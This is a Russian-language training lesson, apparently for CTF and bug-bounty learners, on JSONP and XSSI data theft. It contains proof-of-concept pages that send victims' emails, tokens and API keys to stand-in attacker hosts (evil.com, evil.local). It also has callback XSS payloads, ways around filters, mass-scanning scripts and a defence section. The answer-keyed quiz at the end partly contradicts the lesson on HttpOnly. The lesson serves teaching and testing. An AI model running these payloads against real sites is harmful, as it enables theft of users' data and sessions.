---
id: web-jsonp-xssi
title: "JSONP и XSSI (JSON hijacking)"
category: web
parent: web-browser-core
difficulty: medium
order: 2
tags: [jsonp, xssi, json-hijacking, cors, cross-origin, legacy]
prerequisites: [web-same-origin-cors, web-browser-security]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 40
summary: "Почему JSONP опасен, как работает XSSI и как через теги читать данные, которые SOP вроде бы защищает."
---

JSONP и XSSI — это атаки, которые эксплуатируют **механизм загрузки скриптов**, а не обычные запросы. Браузер позволяет `<script src="...">` обращаться к чужому origin, и если сервер отдаёт данные в формате, который исполняется как JavaScript, атакующий может прочитать эти данные. Это обходит Same-Origin Policy «по определению» — без CORS и без ошибок конфигурации.

## JSONP: что это и почему опасно

JSONP (JSON with Padding) — исторический обход SOP: сервер оборачивает JSON в вызов функции, имя которой задаёт клиент.

```
GET /api/user?callback=handleUser
handleUser({"id":1,"email":"a@b.c"})
```

Клиент определяет глобальную `handleUser`, подключает ответ как `<script>`, и данные попадают в JS. Проблема: **любой сайт может указать свой `callback` и прочитать ответ с сессией жертвы**.

```html
<script>
function steal(d){ fetch('https://evil.com/?d='+JSON.stringify(d)); }
</script>
<script src="https://api.victim.com/user?callback=steal"></script>
```

Если эндпоинт требует аутентификацию и отправляет cookie, данные утекают.

## Поиск JSONP-эндпоинтов

Ключ — параметр `callback` (или `jsonp`, `cb`, `jsonpcallback`, `_callback`).

```bash
# ищем callback-параметры в крауле
katana -u https://t -jc -silent | grep -iE 'callback|jsonp|cb=' | sort -u
# проверяем реакцию
curl -s 'https://t/api/data?callback=test'
# test({"a":1})  -> JSONP подтверждён
# проверяем, отражает ли произвольный callback
curl -s 'https://t/api/data?callback=alert(1)//'
# alert(1)//({"a":1})  -> XSS + JSONP
```

| Параметр | Пример |
|----------|--------|
| `callback` | `?callback=foo` |
| `jsonp` | `?jsonp=foo` |
| `cb` | `?cb=foo` |
| `_callback` | `?_callback=foo` |
| `jsonpcallback` | `?jsonpcallback=foo` |

## JSONP → XSS

Если имя callback не валидируется, оно попадает в ответ как код.

```bash
curl -s 'https://t/api?callback=alert(document.domain)//'
# alert(document.domain)//({...})  -> выполняется в браузере
```

Обходы, если фильтруются символы: `callback=foo.bar`, `callback=foo%5Bbar%5D`, `callback=window.name`, `callback=eval`, использование точки/скобок для обхода регулярки, разделители `//` и `;`.

## XSSI (Cross-Site Script Inclusion)

XSSI — более широкий класс: любое включение скрипта с чужого origin, которое позволяет прочитать данные. Сюда входит не только JSONP, но и:

- **Обычный JSON**, если его можно «исполнить» (например, он начинается с массива и переопределяет `Array`/`Object`).
- **JavaScript-файлы** с чувствительными данными (токены, email), которые можно подключить как скрипт.
- **Скрипты с конфигурацией**, где данные видны через побочные эффекты.

```html
<script>
Array = function(){ /* перехват */ };
</script>
<script src="https://api.victim.com/list"></script>
```

## Защита и её обход

Современные защиты: заголовок `X-Content-Type-Options: nosniff`, `Content-Type: application/json` (не `text/javascript`), префикс ответа (`)]}',\n`), проверка `Referer`/`Origin`, требование кастомного заголовка.

Обходы: `nosniff` не помогает, если ответ отдаётся как `text/javascript`; префикс можно «съесть», если сервер позволяет задать имя переменной/функции; проверка `Referer` обходится, если referrer утекает или проверяется слабо; кастомный заголовок требует preflight, но иногда сервер его не проверяет.

```bash
# проверяем заголовки
curl -sI 'https://t/api/data?callback=test' | grep -iE 'content-type|x-content-type|access-control'
# если Content-Type: text/javascript -> включаемо как скрипт
```

## Разобранный пример: кража данных через JSONP

```bash
# 1. находим JSONP с сессией
$ curl -s 'https://shop.local/api/me?callback=cb' -b 'session=abc'
cb({"email":"victim@shop.local","token":"eyJ..."})

# 2. проверяем, что эндпоинт отдаёт данные с cookie (а не только с токеном)
$ curl -s 'https://shop.local/api/me?callback=cb' | head -c 60
cb({"error":"unauthorized"})
# -> нужен cookie; значит JSONP с сессией жертвы сработает

# 3. строим эксплойт
cat > jsonp.html <<'HTML'
<script>
function cb(d){ fetch('https://evil.local/collect',{method:'POST',body:JSON.stringify(d)}); }
</script>
<script src="https://shop.local/api/me?callback=cb"></script>
HTML
```

Жертва открывает `jsonp.html` — её email и токен утекают на `evil.local`. Артефакт — данные жертвы на вашем сервере.

## Разобранный пример: XSSI через JS-конфиг

```bash
$ curl -s https://t/static/config.js
window.__CONFIG__ = {"apiKey":"AIza...","admin":true};

# подключаем как скрипт на своём сайте и читаем
cat > xssi.html <<'HTML'
<script src="https://t/static/config.js"></script>
<script>fetch('https://evil.local/?k='+window.__CONFIG__.apiKey);</script>
HTML
```

## Крайние случаи и подводные камни

- **Cookie `SameSite=Lax/Strict`** может блокировать отправку cookie при включении скрипта — проверяйте `SameSite`.
- **`HttpOnly`** не защищает от XSSI: данные утекают до JS через чтение переменных, а не `document.cookie`.
- **CORS** не при чём: JSONP/XSSI обходят SOP через `<script>`, а не через `fetch`.
- **Префикс `)]}'`** иногда отсекается браузером как синтаксическая ошибка — но не всегда.
- **`nosniff`** — если Content-Type корректен, включать как скрипт нельзя; проверяйте фактический тип.

## Что делать дальше / решение

1. **Ищите callback-параметры** в крауле и JS.
2. **Проверьте отражение** имени callback — есть ли валидация.
3. **Проверьте аутентификацию** эндпоинта — отдаёт ли данные с cookie.
4. **Соберите PoC** — HTML-страница, подключающая JSONP и отправляющая данные.
5. **Проверьте XSSI** — любые JS-файлы с данными, включаемые как скрипт.
6. **Учтите SameSite** — при `Lax`/`Strict` атака может не сработать.
7. **Тупик** — переходите к CORS/postMessage/XS-Leaks.

## Справочная таблица

| Признак | Что значит | Действие |
|---------|-----------|----------|
| `?callback=test` → `test(...)` | JSONP включён | проверить отражение callback |
| `Content-Type: text/javascript` | включаемо как скрипт | XSSI |
| префикс `)]}',` | защита от XSSI | попробовать «съесть» |
| `SameSite=Lax` | cookie не уйдёт | атака ограничена |
| `nosniff` + JSON | включать нельзя | искать другой вектор |
| отражение callback | возможен XSS | `callback=alert(1)//` |

## Практика: массовый поиск JSONP и XSSI

Ручной поиск медленный, поэтому на большом scope применяют автоматизацию. Первый источник — краулинг: `katana` с исполнением JS собирает URL, среди которых легко грепнуть callback-параметры. Второй источник — JS-бандлы: имена параметров часто захардкожены в клиентском коде. Третий — исторические URL (`gau`, `waybackurls`), где могут остаться забытые JSONP-эндпоинты.

```bash
# 1. собрать URL с callback
katana -u https://t -jc -silent | grep -iE 'callback|jsonp|cb=' | sort -u > jsonp.txt
gau t | grep -iE 'callback|jsonp|cb=' >> jsonp.txt
sort -u jsonp.txt -o jsonp.txt

# 2. для каждого проверить отражение callback
while read u; do
  base="${u%%\?*}"
  r=$(curl -s "${base}?callback=JSONP_TEST")
  echo "$r" | grep -q 'JSONP_TEST' && echo "VULN: $base"
done < jsonp.txt
```

Отдельно ищите XSSI: любые `.js`, отдаваемые с данными. Часто это конфиги вида `config.js`, `settings.js`, `env.js`, которые случайно попали в продакшн.

```bash
# ищем JS с потенциально чувствительными данными
for f in config settings env app-data; do
  curl -s "https://t/static/$f.js" | grep -iE 'key|token|secret|password' && echo "check $f.js"
done
```

## Защита: как правильно

Правильная защита от JSONP/XSSI многослойна. Во-первых, **откажитесь от JSONP** там, где есть CORS — это современный и безопасный механизм. Во-вторых, если JSONP необходим, **валидируйте имя callback** строгим регулярным выражением (`^[a-zA-Z_$][a-zA-Z0-9_$]*$`), не допуская точек, скобок, дефисов. В-третьих, отдавайте **правильный Content-Type** (`application/json`) и заголовок **`X-Content-Type-Options: nosniff`**, чтобы ответ нельзя было включить как скрипт. В-четвёртых, добавьте **префикс** (`)]}',\n`) и не позволяйте его «съесть». В-пятых, проверяйте **`Origin`/`Referer`** для чувствительных эндпоинтов. И, наконец, ставьте cookie **`SameSite=Lax/Strict`** — это заметно ограничивает кросс-сайтовые включения.

Ломается эта защита так: валидация callback через «чёрный список» символов обходится через юникод или допустимые, но опасные конструкции (`foo[bar]`, `window.name`); `nosniff` бесполезен, если Content-Type всё равно `text/javascript`; префикс обходится, если сервер позволяет задать имя переменной; проверка `Referer` — через открытый редирект или отсутствие referrer.

## Связь с другими классами

JSONP/XSSI — часть семейства клиентских утечек, и часто соседствует с CORS-мисконфигом и XS-Leaks. Если JSONP закрыт, но CORS отражает origin — используйте CORS. Если и CORS закрыт, но есть различимое поведение (размер ответа, время, коды) — это XS-Leaks. Все три класса решают одну задачу: прочитать данные или узнать состояние чужого origin из браузера жертвы.

Отдельно стоит помнить про `SameSite`: он не панацея. `Lax` всё ещё отправляет cookie при top-level навигации, а некоторые атаки (например, открытие окна) могут её задействовать. Поэтому не считайте эндпоинт безопасным только из-за `SameSite`.

## Чек-лист тестировщика

- [ ] Найдены все callback-параметры (краул + JS + история).
- [ ] Проверено отражение произвольного callback (XSS).
- [ ] Проверено, отдаёт ли эндпоинт данные с cookie.
- [ ] Проверен Content-Type (включаемо как скрипт или нет).
- [ ] Проверены JS-конфиги с чувствительными данными (XSSI).
- [ ] Проверены `SameSite` cookie и их влияние.
- [ ] Собран PoC-страница с утечкой данных.
- [ ] Тупик → переход к CORS/XS-Leaks.

## Итог и типичные ошибки

Главная ошибка тестировщика — считать JSONP безобидным legacy-механизмом. На деле это полноценный обход SOP, и если эндпоинт отдаёт приватные данные, а callback не валидируется, вы получаете и кражу данных, и XSS одновременно. Вторая ошибка — забывать про XSSI за пределами JSONP: любой JS-файл с данными, включаемый как скрипт, — это утечка. Третья — игнорировать `SameSite`: современный браузер может не отправить cookie, и атака «не сработает» не потому, что защита, а потому, что cookie не ушла — это важно правильно интерпретировать.

Практический вывод: проверяйте JSONP/XSSI наряду с CORS и postMessage, потому что все они — каналы чтения чужого origin. Если хоть один из них открыт, данные утекают, независимо от состояния остальных.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Почему JSONP обходит SOP?"
  options:
    - "`<script>` исполняет кросс-ориджин JS, а SOP не мешает загрузке скриптов"
    - "Он шифрует данные"
    - "Он использует HTTPS"
    - "Он меняет cookie"
  answer: 0
  explanation: "Скрипт-теги не подчиняются SOP на чтение, поэтому JSONP-ответ исполняется."
- question: "Что такое XSSI?"
  options:
    - "Чтение данных через включение чужого JS/данных как скрипта"
    - "SQL-инъекция"
    - "Отравление DNS"
    - "CSRF"
  answer: 0
  explanation: "Cross-Site Script Inclusion — класс утечки через скрипт-теги."
- question: "Какой префикс используют против XSSI?"
  options:
    - "`while(1);`"
    - "`<!--`"
    - "`<?xml`"
    - "`%PDF`"
  answer: 0
  explanation: "`while(1);` в начале ответа «вешает» исполнение как скрипта."
- question: "Какой заголовок мешает исполнить JSON как JS?"
  options:
    - "`X-Content-Type-Options: nosniff`"
    - "`Server`"
    - "`Referer`"
    - "`Age`"
  answer: 0
  explanation: "`nosniff` + правильный `Content-Type` закрывают MIME-сниффинг."
- question: "Что влияет на то, утекут ли данные через JSONP?"
  options:
    - "Политика cookie (`SameSite`, `HttpOnly`)"
    - "Порт сервера"
    - "HTTP-метод"
    - "User-Agent"
  answer: 0
  explanation: "Если cookie не уходят, JSONP может отдать анонимные данные, но не приватные."
```

## Где пригодится

- **CTF (Web):** задачи на SOP-обход и JSON-hijacking.
- **Bug bounty:** живые JSONP-эндпоинты — утечка данных, часто недооценённая.
- **Пентест:** аудит API на callback-параметры и XSSI-защиту.
- **Работа (AppSec/Dev):** отказ от JSONP в пользу CORS, `nosniff`, префиксы.
